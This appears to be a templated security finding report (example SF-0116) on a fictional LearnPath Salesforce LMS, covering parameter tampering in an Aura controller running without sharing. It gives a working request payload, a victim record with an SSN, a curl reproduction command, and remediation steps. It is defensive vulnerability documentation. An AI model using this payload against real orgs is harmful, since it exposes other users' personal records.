# Security Analysis Report
**System:** LearnPath Assessment Platform (Salesforce-Integrated)
**Domain:** Education / EdTech LMS
**Example ID:** SF-0116
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering — attacker substitutes `accountId` in `c.AccountController.getAccounts` to read any LMS Account record, bypassing OWD=Private |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering (Pattern 2.4)

### Summary
The Aura controller `c.AccountController.getAccounts` on LearnPath Assessment Platform (`c32ea424.lightning.force.com`) accepts a client-supplied `accountId` and executes a SOQL query `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 2.4, an attacker with a valid Salesforce session substitutes any `accountId` in the Aura action payload to escalate their privilege and read Account records owned by other users — including `SensitiveData__c` (SSN) and `InternalNotes__c`.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getAccountDetails`, but §5.0 and §6.0 HAR use `c.AccountController.getAccounts`. These conflict. The HAR (§6.0) is the primary evidence for the Aura descriptor — `c.AccountController.getAccounts` is the authoritative affected endpoint.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://c32ea424.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://c32ea424.lightning.force.com/aura
Authorization: Bearer 00DC32EA424!ARc32ea424...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DC32EA424!ARc32ea424...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.AccountController.getAccounts",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "accountId": "001A424",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Account Record Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001A424",
        "Name": "Victim Account Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-86-9244"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-86-9244` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user.

### Steps to Reproduce
1. Authenticate to LearnPath on `c32ea424.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `accountId`:
```bash
curl -s -X POST "https://c32ea424.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DC32EA424!ARc32ea424..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00DC32EA424!ARc32ea424..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"001A424","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-86-9244) and InternalNotes__c for victim record 001A424
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `AccountController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
